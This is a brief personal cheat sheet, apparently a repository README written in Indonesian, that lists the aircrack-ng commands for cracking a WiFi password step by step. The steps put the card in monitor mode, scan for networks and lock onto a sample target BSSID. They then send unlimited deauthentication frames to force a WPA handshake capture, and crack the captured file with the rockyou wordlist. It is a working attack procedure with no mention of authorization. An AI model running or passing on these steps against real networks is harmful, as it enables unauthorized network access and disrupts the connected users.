# aircrack-tutorial
buat pribadi catatan run cmd jika lupa

TUTORIAL WIFI CRACKING 

1.ip addr
2.iwconfig -mode managed
3.sudo airmon-ng check kill - mematikan semua conection
4.sudo airmon-ng start wlan0 -mode monitor
5.iwconfig - check ulang apakah sudah mode monitor
6.sudo airmon-ng - cek nama interface bisa wlan0/wlan0mon
7.sudo airodump-ng wlan0 - untuk monitor wifi tersedia (ctrl+c untuk stop scan)
8.catat bssid target contoh 98:F4:28:47:85:C8 channel 11
9.sudo airodump-ng wlan0 -d 98:F4:28:47:85:C8 - untuk show single target scan
10.sudo airodump-ng -w hack1 -c 11 --bssid 98:F4:28:47:85:C8 wlan0
11.sudo aireplay-ng --deauth 0 -a 98:F4:28:47:85:C8 wlan0 (sniff wpa hansake didapatkan)
12.ctrl + c quit all program scan berjalan 
13.buka ls folder file hack1.pap dengan wiresharks
14.cmd = wireshark hack1-01.cap
15.sudo airmon-ng stop wlan0 - monitor disable
16.cek iwconfig - mode managed lagi
17.sudo aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
18.tunggu beberapa saat aircrack mengidentifikasi sandi 

tes wifi card bisa inject
aireplay-ng -9 wlan0

iw list | grep AP$
